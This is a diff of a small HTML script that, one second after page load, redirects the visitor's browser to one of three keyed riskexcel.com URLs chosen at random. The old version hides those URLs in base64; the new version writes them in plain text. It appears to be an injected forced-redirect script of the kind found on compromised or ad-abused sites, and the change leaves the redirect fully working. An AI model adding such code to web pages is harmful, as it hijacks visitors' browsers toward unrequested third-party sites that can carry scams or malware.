@@ -1,19 +1,15 @@
 <script>
   setTimeout(function() {
-    
-    var base64Urls = [
-      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL2ViOGZhc3k5ZWg/a2V5PWI4ZDY1YWNjYzg1ODA0Mzc0ZTUwODQzZjEwNmIwOGJh",
-      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL21xN2MxczU1bj9rZXk9ZmJjNjY3Y2NlOGJhOWI4YjkyNWQxYjA4NTg2ZGMyNGU=",
-      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL3B5ZWttM3IwP2tleT0xYTk2YmVhNWUxZGYxODM2MWUxNTgyNDBiOTE1Zjk1Ng=="
+    var urls = [
+      "https://riskexcel.com/eb8fasy9eh?key=b8d65accc85804374e50843f106b08ba",
+      "https://riskexcel.com/mq7c1s55n?key=fbc667cce8ba9b8b925d1b08586dc24e",
+      "https://riskexcel.com/pyekm3r0?key=1a96bea5e1df18361e158240b915f956"
     ];
 
-    
-    var randomIndex = Math.floor(Math.random() * base64Urls.length);
+    var randomIndex = Math.floor(Math.random() * urls.length);
 
-    
-    var decodedUrl = atob(base64Urls[randomIndex]);
-    window.location.href = decodedUrl;
-  }, 1000);
+    window.location.href = urls[randomIndex];
+  }, 1000); 
 </script>
 
 
